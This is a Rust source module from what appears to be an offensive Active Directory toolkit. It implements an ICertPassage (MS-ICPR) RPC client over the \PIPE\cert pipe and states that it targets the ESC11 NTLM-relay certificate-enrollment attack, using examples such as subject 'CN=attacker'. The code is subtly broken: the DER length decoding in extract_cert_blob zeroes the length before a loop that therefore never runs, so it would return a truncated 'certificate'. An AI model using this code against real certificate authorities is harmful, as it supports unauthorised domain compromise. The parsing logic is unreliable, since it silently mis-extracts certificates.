//! ICertPassage RPC client — direct CA enrollment over `\PIPE\cert`.
//!
//! Implements the MS-ICPR `ICertPassage` interface (UUID `91ae6020-9e3c-11cf-8d7c-00aa00c091be`)
//! for submitting PKCS#10 certificate requests and collecting responses.
//!
//! The ICertPassage interface differs from ICertRequestD (used in [`cert_store`]) in that
//! it exposes a wider range of enrollment methods including agency and challenge-based flows.
//! This module targets the ESC11 attack path (NTLM relay to ICPR with disabled encryption enforcement).
//!
//! References:
//! - MS-ICPR: ICertPassage Protocol Specification
//! - ICertPassage UUID: 91ae6020-9e3c-11cf-8d7c-00aa00c091be

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::epm::{build_rpc_bind, build_rpc_request, is_bind_accepted, ndr_conformant_string};
use overthrone_core::proto::smb::SmbSession;
use tracing::{debug, info};

/// ICertPassage interface UUID (little-endian byte order)
/// UUID: 91ae6020-9e3c-11cf-8d7c-00aa00c091be
pub const ICPR_PASSAGE_UUID: [u8; 16] = [
    0x20, 0x60, 0xae, 0x91, 0x3c, 0x9e, 0xcf, 0x11, 0x8d, 0x7c, 0x00, 0xaa, 0x00, 0xc0, 0x91, 0xbe,
];

/// ICPR named pipe for certificate requests
pub const ICPR_NAMED_PIPE: &str = "cert";

/// ICertPassage opnums
const OPNUM_CERT_SERVER_REQUEST: u16 = 1;
#[cfg_attr(not(test), allow(dead_code))]
const OPNUM_CERT_SERVER_RESPONSE: u16 = 3;

/// Low-level RPC connection to the CA certificate pipe.
///
/// Manages the SMB session and RPC bind state for the ICertPassage interface.
pub struct RequestClient<'a> {
    smb: &'a SmbSession,
}

impl<'a> RequestClient<'a> {
    /// Create a new client from an existing SMB session.
    pub fn new(smb: &'a SmbSession) -> Self {
        Self { smb }
    }

    /// Bind to the ICertPassage interface on `\PIPE\cert`.
    pub async fn bind(&self) -> Result<Vec<u8>> {
        let bind_req = build_rpc_bind(&ICPR_PASSAGE_UUID, 1, 0);
        let resp = self
            .smb
            .pipe_transact(ICPR_NAMED_PIPE, &bind_req)
            .await
            .map_err(|e| OverthroneError::Rpc {
                target: format!("{}:cert", self.smb.target),
                reason: format!("ICertPassage bind failed: {e}"),
            })?;

        if !is_bind_accepted(&resp) {
            return Err(OverthroneError::Rpc {
                target: format!("{}:cert", self.smb.target),
                reason: "ICertPassage bind rejected".to_string(),
            });
        }

        debug!("[ICertPassage] Bind accepted");
        Ok(resp)
    }

    /// Send a `CertServerRequest` (opnum 1) with a PKCS#10 CSR.
    pub async fn cert_server_request(
        &self,
        ca_name: &str,
        _template: &str,
        subject: &str,
        csr_der: &[u8],
    ) -> Result<CertServerResponse> {
        // NDR stub:
        let mut stub = Vec::new();

        // Context handle (20 bytes — zeros for first call)
        stub.extend_from_slice(&[0u8; 20]);

        // pwszAuthority — CA name as conformant string
        stub.extend_from_slice(&ndr_conformant_string(ca_name));

        // dwFlags — 0
        stub.extend_from_slice(&0u32.to_le_bytes());

        // dwRequestIdOffset — 0
        stub.extend_from_slice(&0u32.to_le_bytes());

        // pctbRequestIn — CERTTRANSBLOB containing the CSR
        let count = csr_der.len() as u32;
        stub.extend_from_slice(&count.to_le_bytes());
        stub.extend_from_slice(&0x00020004u32.to_le_bytes());
        while stub.len() % 8 != 0 {
            stub.push(0);
        }
        stub.extend_from_slice(&count.to_le_bytes());
        stub.extend_from_slice(&0u32.to_le_bytes());
        stub.extend_from_slice(&count.to_le_bytes());
        stub.extend_from_slice(csr_der);

        // pwszAttributes — empty conformant string
        stub.extend_from_slice(&ndr_conformant_string(""));

        // pwszRequestSubject — subject conformant string
        stub.extend_from_slice(&ndr_conformant_string(subject));

        // Output argument placeholders
        stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // pdwRequestId ptr
        stub.extend_from_slice(&0u32.to_le_bytes());
        stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // pdwDisposition ptr
        stub.extend_from_slice(&0u32.to_le_bytes());
        stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // pctbCertChain ptr
        stub.extend_from_slice(&0u32.to_le_bytes());
        stub.extend_from_slice(&0u32.to_le_bytes());
        stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // pdwEncodedDisposition ptr
        stub.extend_from_slice(&0u32.to_le_bytes());

        let req = build_rpc_request(OPNUM_CERT_SERVER_REQUEST, &stub);
        let resp = self
            .smb
            .pipe_transact(ICPR_NAMED_PIPE, &req)
            .await
            .map_err(|e| OverthroneError::Rpc {
                target: format!("{}:cert", self.smb.target),
                reason: format!("CertServerRequest failed: {e}"),
            })?;

        parse_cert_server_response(&resp, ca_name)
    }
}

/// Parsed response from a CertServerRequest call.
#[derive(Debug)]
pub struct CertServerResponse {
    /// Request ID assigned by the CA (0 if not available)
    pub request_id: u32,
    /// Disposition code (3 = issued, 2 = pending, 1 = error, 4 = denied)
    pub disposition: u32,
    /// Raw DER-encoded certificate bytes, if issued
    pub cert_der: Option<Vec<u8>>,
    /// HRESULT status code
    pub hresult: u32,
}

/// Parse the ICertPassage CertServerRequest response.
fn parse_cert_server_response(resp: &[u8], _ca_name: &str) -> Result<CertServerResponse> {
    if resp.len() < 24 {
        return Err(OverthroneError::CertificateRequest(
            "CertServerRequest response too short".to_string(),
        ));
    }

    let stub_start = 24usize;

    if stub_start + 4 > resp.len() {
        return Err(OverthroneError::CertificateRequest(
            "CertServerRequest response too short for status".to_string(),
        ));
    }

    let hresult = u32::from_le_bytes([
        resp[stub_start],
        resp[stub_start + 1],
        resp[stub_start + 2],
        resp[stub_start + 3],
    ]);

    if hresult != 0 && hresult != 1 && hresult & 0x80000000 != 0 {
        return Err(OverthroneError::CertificateRequest(format!(
            "CertServerRequest returned HRESULT 0x{:08X}",
            hresult
        )));
    }

    let request_id = if stub_start + 8 <= resp.len() {
        Some(u32::from_le_bytes([
            resp[stub_start + 4],
            resp[stub_start + 5],
            resp[stub_start + 6],
            resp[stub_start + 7],
        ]))
    } else {
        None
    };

    let disposition = if stub_start + 12 <= resp.len() {
        u32::from_le_bytes([
            resp[stub_start + 8],
            resp[stub_start + 9],
            resp[stub_start + 10],
            resp[stub_start + 11],
        ])
    } else {
        0
    };

    debug!("[ICertPassage] Disposition: {}", disposition);

    match disposition {
        1 => {
            return Err(OverthroneError::CertificateRequest(
                "Certificate request denied by CA".to_string(),
            ));
        }
        2 => {
            return Ok(CertServerResponse {
                request_id: request_id.unwrap_or(0),
                disposition: 2,
                cert_der: None,
                hresult,
            });
        }
        4 => {
            return Err(OverthroneError::CertificateRequest(
                "Certificate request denied by policy".to_string(),
            ));
        }
        _ => {}
    }

    let cert_der = extract_cert_blob(resp, stub_start + 24);
    let request_id = request_id.unwrap_or(0);

    Ok(CertServerResponse {
        request_id,
        disposition,
        cert_der,
        hresult,
    })
}

/// Extract a DER certificate blob from the RPC response.
fn extract_cert_blob(resp: &[u8], search_start: usize) -> Option<Vec<u8>> {
    for i in (search_start..resp.len().saturating_sub(8)).step_by(4) {
        if resp[i] == 0x30 && (resp[i + 1] & 0x80) != 0 {
            let mut der_len = resp[i + 1] as usize & 0x7f;
            if (resp[i + 1] & 0x80) != 0 {
                der_len = 0;
                for j in 0..der_len.min(4) {
                    if i + 2 + j < resp.len() {
                        der_len = (der_len << 8) | resp[i + 2 + j] as usize;
                    }
                }
            }
            let total = der_len + 4;
            if i + total <= resp.len() {
                let cert = resp[i..i + total].to_vec();
                info!("[ICertPassage] Certificate found ({} bytes)", cert.len());
                return Some(cert);
            }
        }
    }

    let mut i = search_start;
    while i + 12 < resp.len() {
        let max_count = u32::from_le_bytes([resp[i], resp[i + 1], resp[i + 2], resp[i + 3]]);
        let offset = u32::from_le_bytes([resp[i + 4], resp[i + 5], resp[i + 6], resp[i + 7]]);
        let actual = u32::from_le_bytes([resp[i + 8], resp[i + 9], resp[i + 10], resp[i + 11]]);

        if offset == 0 && actual > 200 && actual < 50000 && max_count >= actual {
            let data_start = i + 12;
            if data_start + actual as usize <= resp.len() && resp[data_start] == 0x30 {
                let cert = resp[data_start..data_start + actual as usize].to_vec();
                info!("[ICertPassage] Certificate via blob scan ({} bytes)", cert.len());
                return Some(cert);
            }
        }
        i += 4;
    }

    None
}

/// High-level certificate service that wraps the ICertPassage RPC interface.
///
/// Provides a convenient interface for ESC11-style certificate enrollment
/// where the caller has an authenticated SMB session to the CA.
pub struct RemoteCertService<'a> {
    client: RequestClient<'a>,
}

impl<'a> RemoteCertService<'a> {
    /// Create a new service wrapping an existing SMB session.
    pub fn new(smb: &'a SmbSession) -> Self {
        Self {
            client: RequestClient::new(smb),
        }
    }

    /// Request a certificate from the CA.
    ///
    /// # Arguments
    /// * `ca_name` - CA common name, e.g. "domain-CA"
    /// * `template` - Certificate template name, e.g. "User"
    /// * `subject` - Subject for the certificate, e.g. "CN=attacker"
    /// * `csr_der` - PKCS#10 DER-encoded CSR
    ///
    /// # Returns
    /// Raw DER-encoded X.509 certificate bytes.
    pub async fn request_certificate(
        &self,
        ca_name: &str,
        _template: &str,
        subject: &str,
        csr_der: &[u8],
    ) -> Result<Vec<u8>> {
        info!(
            "[RemoteCertService] Requesting cert via ICertPassage: CA={}, template={}, subject={}",
            ca_name, _template, subject
        );

        self.client.bind().await?;
        let resp = self
            .client
            .cert_server_request(ca_name, _template, subject, csr_der)
            .await?;

        match resp.cert_der {
            Some(cert) => {
                info!("[RemoteCertService] Certificate obtained ({} bytes)", cert.len());
                Ok(cert)
            }
            None => Err(OverthroneError::CertificateRequest(format!(
                "CertServerRequest succeeded but no certificate in response (disposition={}, request_id={})",
                resp.disposition, resp.request_id
            ))),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_icpassage_uuid() {
        let expected: [u8; 16] = [
            0x20, 0x60, 0xae, 0x91, 0x3c, 0x9e, 0xcf, 0x11, 0x8d, 0x7c, 0x00, 0xaa, 0x00, 0xc0,
            0x91, 0xbe,
        ];
        assert_eq!(ICPR_PASSAGE_UUID, expected);
    }

    #[test]
    fn test_parse_response_hresult_error() {
        let mut resp = vec![0u8; 24];
        resp.extend_from_slice(&0x80094001u32.to_le_bytes());
        let result = parse_cert_server_response(&resp, "test-CA");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("HRESULT"));
    }

    #[test]
    fn test_parse_response_short() {
        let result = parse_cert_server_response(&[0u8; 10], "test-CA");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_response_pending() {
        let mut resp = vec![0u8; 24];
        resp.extend_from_slice(&0u32.to_le_bytes()); // HRESULT = 0
        resp.extend_from_slice(&5u32.to_le_bytes()); // request_id = 5
        resp.extend_from_slice(&2u32.to_le_bytes()); // disposition = 2 (pending)
        let result = parse_cert_server_response(&resp, "test-CA");
        assert!(result.is_ok());
        let ok = result.unwrap();
        assert_eq!(ok.disposition, 2);
        assert_eq!(ok.request_id, 5);
        assert!(ok.cert_der.is_none());
    }

    #[test]
    fn test_opnum_constants() {
        assert_eq!(OPNUM_CERT_SERVER_REQUEST, 1);
        assert_eq!(OPNUM_CERT_SERVER_RESPONSE, 3);
    }

    #[test]
    fn test_remote_cert_service_new() {
        // Just test that construction works; we can't test RPC without a live CA.
        // verification is done via type-checking at compile time.
        fn _assert_send<T: Send>() {}
        fn _assert_sync<T: Sync>() {}
        _assert_send::<RemoteCertService<'_>>();
        // RemoteCertService is !Sync because it holds &SmbSession
    }
}
